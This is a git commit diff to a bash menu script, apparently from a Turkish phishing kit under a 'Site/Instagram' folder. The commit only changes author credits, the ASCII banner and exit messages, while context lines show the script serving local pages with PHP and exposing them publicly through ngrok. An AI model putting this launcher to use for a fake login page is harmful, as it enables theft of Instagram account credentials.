824a7ccdb4da467276a1a210ec85ada3a03a53f0
Mr.Neowise <58039450+NE0WISE@users.noreply.github.com>
2020-11-27 17:57:35 +0300

    Update start.sh

--- Site/Instagram/start.sh
+++ Site/Instagram/start.sh
@@ -1,20 +1,16 @@
 #!/bin/bash|
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Code: MR.Neowise
+#Youtube : Serhat Türk
 
 clear
 
 echo -e '\033[32;40;1m
-        /\︵-︵/\
-        |( ◉)(◉)|
-        \ ︶V︶ /
-        /↺↺↺↺↺↺↺\
-        ↺↺↺↺↺↺↺↺|
-        \↺↺↺↺↺↺↺/
-        ¯¯/\¯/\¯¯ '
-
+       
+███    ██ ███████  ██████  ██     ██ ██ ███████ ███████ 
+████   ██ ██      ██    ██ ██     ██ ██ ██      ██      
+██ ██  ██ █████   ██    ██ ██  █  ██ ██ ███████ █████   
+██  ██ ██ ██      ██    ██ ██ ███ ██ ██      ██ ██      
+██   ████ ███████  ██████   ███ ███  ██ ███████ ███████ 
 
 
 echo -e "\033[31;40;1m
@@ -25,7 +21,7 @@ echo -e "\033[31;40;1m
 \e[31m[00]\e[37m Menü
 \e[31m[99]\e[37m Exit
 "
-echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
+echo -e "\033[32;40;1m                      ~~~Mr.Neowise~~~"
 echo ""
 read -p "İslem Numarası : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -56,7 +52,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	elif [[ $islem == 9 || $islem == 99 ]]; then
 	clear
-	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+	echo -e "\e[31mMr.Neowise İyi Günler Diler :)) ßß"
 	sleep 1 
 	exit 1
 elif [[ $islem == 00 ]]; then
